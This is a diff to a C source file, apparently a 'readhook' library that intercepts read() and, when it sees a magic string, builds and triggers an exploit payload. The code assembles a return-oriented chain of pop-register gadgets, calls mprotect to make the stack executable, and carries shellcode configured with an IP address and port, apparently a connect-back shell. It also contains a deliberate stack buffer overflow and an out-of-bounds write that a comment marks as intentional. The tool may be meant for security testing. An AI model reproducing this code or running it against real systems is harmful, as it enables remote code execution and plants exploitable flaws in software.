@@ -137,6 +137,7 @@ static const char *s_magic = "xyzzy";
 
 static const char *s_makeload = "MAKELOAD";
 static const char *s_dumpload = "DUMPLOAD";
+static const char *s_dofixups = "DOFIXUPS";
 static const char *s_testload = "TESTLOAD";
 static const char *s_overflow = "OVERFLOW";
 
@@ -187,9 +188,9 @@ static Payload payload = {
 			0x57,						// push		%rdi
 			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
 			0x0f, 0x05					// syscall
-		}
-	}
-};
+		} // .raw
+	} // .pl_scu
+}; // payload
 
 _Bool initialized = 0;
 
@@ -205,14 +206,13 @@ Pointer stack_base					= NULL;
 Pointer buffer_base					= NULL;
 
 static Pointer pageBase(Pointer p) {
-	return (Pointer) (((unsigned long) p) & (-1^getpagesize()-1));
+	return (Pointer) (((unsigned long) p) & (-1 ^ getpagesize() - 1));
 } // pageBase()
 
 static Pointer elfBase(Pointer p) {
 	p = pageBase(p);
-	while (strncmp(p, s_elf_signature, strlen(s_elf_signature))) {
+	while (strncmp(p, s_elf_signature, strlen(s_elf_signature)))
 		p -= getpagesize();
-	} // while
 
 	return p;
 } // elfBase()
@@ -221,7 +221,7 @@ static Pointer stackPage(void) {
 	int dummy = 0;
 
 	return pageBase(&dummy);
-} // stackBase()
+} // stackPage()
 
 static char *strnstr(const char *s1, const char *s2, size_t len)
 {
@@ -229,16 +229,18 @@ static char *strnstr(const char *s1, const char *s2, size_t len)
 
 	if (!l2)
 		return (char *)s1;
+
 	while (len >= l2) {
 		len--;
 		if (!memcmp(s1, s2, l2))
 			return (char *)s1;
 		s1++;
-	}
-	return NULL;
-}
+	} // while
 
-static Pointer findGadget(const Pointer start, const char *gadget, const size_t size){
+	return NULL;
+} // strnstr()
+
+static Pointer findGadget(const Pointer start, const char *gadget, const size_t size) {
      return strnstr(libc_base, gadget, size);
 } // findGadget()
 
@@ -258,6 +260,7 @@ static void initialize(void)
 
 		stack_base	= stackPage();
 
+ 		// TODO: These globals aren't thread safe so initialize every time.
 		//initialized = 1;
 	} // if
 
@@ -300,32 +303,22 @@ static AddressUnion fixupAddressUnion(AddressUnion au) {
 	return au;
 } // fixupAddressUnion()
 
-static int lookupHostName(char *hostName , char *ip)
+static int lookupHostName(char *hostName, char *ip)
 {
-    struct hostent *he;
-    struct in_addr **addr_list;
-    int i;
-         
-    if ((he = gethostbyname(hostName)) == NULL) 
-    {
-        herror("gethostbyname");
-        return 1;
-    }
+    struct hostent *he = gethostbyname(hostName);;
+    if (he == NULL)
+		return 1;
  
-    addr_list = (struct in_addr **) he->h_addr_list;
-     
-    for(i = 0; addr_list[i] != NULL; i++) 
-    {
-        strcpy(ip , inet_ntoa(*addr_list[i]) );
-        return 0;
-    }
+    struct in_addr **addr_list = (struct in_addr **) he->h_addr_list;
+    for (int i = 0; addr_list[i] != NULL; i++) {
+		strcpy(ip, inet_ntoa(*addr_list[i]));
+		return 0;
+    } // for
      
     return 1;
-}
+} // lookupHostName()
 
 static void makeload(PayloadPtr plp) {
-	printf("In makeload()\n");
-
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
 	// Offsets are relative to the payload
@@ -357,65 +350,65 @@ static void makeload(PayloadPtr plp) {
 l_popRDI:
 		__asm__ ("pop %rdi");
 		__asm__ ("ret");
-	}
+	} // if
 
 	// Gadget for "POP RSI"
 	if (v) {
 l_popRSI:
 		__asm__ ("pop %rsi");
 		__asm__ ("ret");
-	}
+	} // if
 
 	// Gadget for "POP RDX"
 	if (v) {
 l_popRDX:
 		__asm__ ("pop %rdx");
 		__asm__ ("ret");
-	}
+	} // if
 
 	return;
 } // makeload()
 
 static void dumpload(PayloadPtr plp) {
-	printf("In dumpload()\n");
-
-	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",	"pl_canary.p",		plp->pl_canary.p);
-	printf("%20s: %p\n",	"pl_rbp.p",		plp->pl_rbp.p);
-	printf("%20s: %p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
-	printf("%20s: %p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
-	printf("%20s: %p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
-	printf("%20s: %#tx\n",	"pl_stackSize",		plp->pl_stackSize);
-	printf("%20s: %p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
-	printf("%20s: %#tx\n",	"pl_permission",	plp->pl_permission);
-	printf("%20s: %p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
-	printf("%20s: %p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
-	printf("%20s: %d\n",	"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
-	printf("%20s: %s\n",	"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
-	printf("--------------------------------------------\n");
+	fprintf(stderr, "--------------------------------------------\n");
+	fprintf(stderr, "%20s: %p\n",	"pl_canary.p",		plp->pl_canary.p);
+	fprintf(stderr, "%20s: %p\n",	"pl_rbp.p",		plp->pl_rbp.p);
+	fprintf(stderr, "%20s: %p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
+	fprintf(stderr, "%20s: %p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
+	fprintf(stderr, "%20s: %p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
+	fprintf(stderr, "%20s: %#tx\n",	"pl_stackSize",		plp->pl_stackSize);
+	fprintf(stderr, "%20s: %p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
+	fprintf(stderr, "%20s: %#tx\n",	"pl_permission",	plp->pl_permission);
+	fprintf(stderr, "%20s: %p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
+	fprintf(stderr, "%20s: %p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
+	fprintf(stderr, "%20s: %d\n",	"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
+	fprintf(stderr, "%20s: %s\n",	"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
+	fprintf(stderr, "--------------------------------------------\n");
 } // dumpload()
 
-static void doFixups(Pointer p, size_t n) {
-	printf("In doFixups()\n");
-
-	// Perform fixups on anything in range, on 8 byte boundaries, that contains a valid fixup signature
-	for (AddressUnionPtr aup = (AddressUnionPtr)p; aup < (AddressUnionPtr) (p + n - sizeof(AddressUnionPtr) + 1); aup++) {
-		*aup = fixupAddressUnion(*aup);
-	} // for
-} // doFixups()
-
-static void overflow(Pointer src, size_t n) {
+static void dofixups(Pointer p, size_t n) {
 	char dst[8] = {0};
 
-	printf("In overflow()\n");
-
-	// Fixups
+	// This should wind up being the same address as it is in overflow()
 	buffer_base = &dst;
-	doFixups(src, n);
-dumpload((PayloadPtr) src);
 
-	memcpy(dst, src, n);
+	// Perform fixups on anything in range, on 8 byte boundaries, that contains a valid fixup signature
+	for (AddressUnionPtr aup = (AddressUnionPtr)p; aup < (AddressUnionPtr) (p + n - sizeof(AddressUnionPtr) + 1); aup++)
+		*aup = fixupAddressUnion(*aup);
+} // dofixups()
+
+static void overflow(Pointer p, size_t n) {
+	char dst[8] = {0};
+
+	memcpy(dst, p, n);
 } // overflow()
+
+static void testload(Pointer p, size_t n) {
+	volatile char dst[8] = {0};
+
+	dofixups(p, n);
+	overflow(p, n);
+} // testload()
 
 ssize_t read(int fd, void *buf, size_t count) {
 	initialize();
@@ -423,8 +416,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 
 	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);
 
-	if (p)
-	{
+	if (p) {
 		p += strlen(s_magic);
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
@@ -454,41 +446,40 @@ ssize_t read(int fd, void *buf, size_t count) {
 				} // if
 			} // if
 
-			// Show what we have
-			dumpload(&payload);
-
 			// Generate the payload that we will "echo" back
-                        unsigned char sPayload64[4096];
-                        size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
+			unsigned char sPayload64[4096];
+			size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
 
 			// Make room for the payload (where the request used to be).
-                        char *src = p + nc;
-                        char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
+			char *src = p + nc;
+			char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
 			int delta = dst - src;
-                        memmove(dst, src, delta);
+			memmove(dst, src, delta);
 
 			// Replace s_makeload with s_overflow
 			memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
 			p += strlen(s_overflow) - strlen(s_makeload);
 
 			// Place the payload in the newly created space
-                        memcpy(p, sPayload64, nPayload64);
+			memcpy(p, sPayload64, nPayload64);
 
 			// Adjust the number of characters read
-                        result += delta;
+			result += delta;
 
 			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
-                        ((char *) buf)[result] = 0;
+			((char *) buf)[result] = 0;
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
-		else if (!strncmp(s_testload, p, strlen(s_testload))) {
-			overflow((Pointer)&payload, sizeof(payload));
-		}
+		else if (!strncmp(s_dofixups, p, strlen(s_dofixups)))
+			dofixups((Pointer)&payload, sizeof(payload));
+		else if (!strncmp(s_testload, p, strlen(s_testload)))
+			testload((Pointer)&payload, sizeof(payload));
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
 			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
-                        size_t n256 = decode64(s64, length64(s64), (unsigned char *) p, 65535);
-                        overflow(p, n256);
+			size_t n256 = decode64(s64, length64(s64), (unsigned char *) p, 65535);
+			dofixups(p, n256);
+			overflow(p, n256);
 		} // else if
 	} // if
 
@@ -498,6 +489,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 #ifdef READHOOK_MAIN
 int main(int argc, char **argv)
 {
+	fprintf(stderr, "Running as an executable\n");
+
 	assert(sizeof(short) == 2);
 	assert(sizeof(int) == 4);
 	assert(sizeof(long) == 8);
@@ -511,10 +504,10 @@ int main(int argc, char **argv)
 	assert(getpagesize() == 4096);
 	assert((-1^(getpagesize()-1))==0xfffffffffffff000);
 
-	printf("Running as an executable\n");
-        initialize();
-        makeload(&payload);
-        dumpload(&payload);
-        overflow((char *) &payload, sizeof(payload));
+	initialize();
+	makeload(&payload);
+	dumpload(&payload);
+	testload((Pointer)&payload, sizeof(payload));
+	dumpload(&payload);
 } // main()
 #endif
